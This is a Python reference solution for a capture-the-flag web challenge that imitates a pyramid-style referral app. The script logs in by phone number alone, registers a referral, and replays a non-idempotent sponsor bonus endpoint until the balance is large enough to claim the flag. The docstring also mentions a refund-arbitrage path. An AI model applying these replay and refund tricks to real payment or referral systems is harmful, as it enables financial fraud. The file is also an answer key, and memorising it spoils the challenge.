#!/usr/bin/env python3
"""Reference solver for web-reseau-pyramide.

Path used here: the sponsor activation bonus (`/api/bonus/activation`) is NOT
idempotent — it credits the sponsor every time it is called, not once per
filleul. So we (1) register one filleul under ROOT, (2) fund + activate it with
one starter purchase, then (3) replay the bonus until ROOT's balance clears the
jackpot, and (4) collect the flag.

(A second, independent path exists — refund arbitrage: the sponsor's commission
is not clawed back on /api/refund. See solution/README.md.)

Usage: python3 solve.py http://HOST:PORT   # prints NCTF{...} on the last line
"""
import sys

import requests

ROOT_PHONE = "22890000000"
FILLEUL_PHONE = "22811111111"
PRIME = 3_000
FLAG_AT = 1_050_000


def solve(base):
    base = base.rstrip("/")
    s = requests.Session()

    # 1) log in as our distributor account ROOT
    r = s.post(f"{base}/api/login", json={"phone": ROOT_PHONE})
    r.raise_for_status()

    # 2) register a filleul under ROOT (phone is never verified)
    r = s.post(
        f"{base}/api/register",
        json={"phone": FILLEUL_PHONE, "parrain_code": "ROOT"},
    )
    r.raise_for_status()
    filleul = r.json()["code"]

    # 3) fund the filleul and activate it (one starter purchase)
    s.post(
        f"{base}/api/transfer", json={"to_code": filleul, "montant": 5_000}
    ).raise_for_status()
    s.post(f"{base}/api/login", json={"phone": FILLEUL_PHONE}).raise_for_status()
    s.post(f"{base}/api/buy", json={"product": "starter", "qty": 1}).raise_for_status()

    # 4) back to ROOT, replay the activation bonus until we clear the jackpot
    s.post(f"{base}/api/login", json={"phone": ROOT_PHONE}).raise_for_status()
    wallet = s.get(f"{base}/api/me").json()["wallet"]
    needed = FLAG_AT - wallet
    calls = max(0, -(-needed // PRIME))  # ceil
    for _ in range(calls):
        s.post(f"{base}/api/bonus/activation", json={"filleul_code": filleul})

    # 5) collect the flag
    r = s.get(f"{base}/flag")
    flag = r.json().get("flag")
    if not flag:
        print("no flag:", r.text, file=sys.stderr)
        return 1
    print(flag)
    return 0


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
    sys.exit(solve(base))
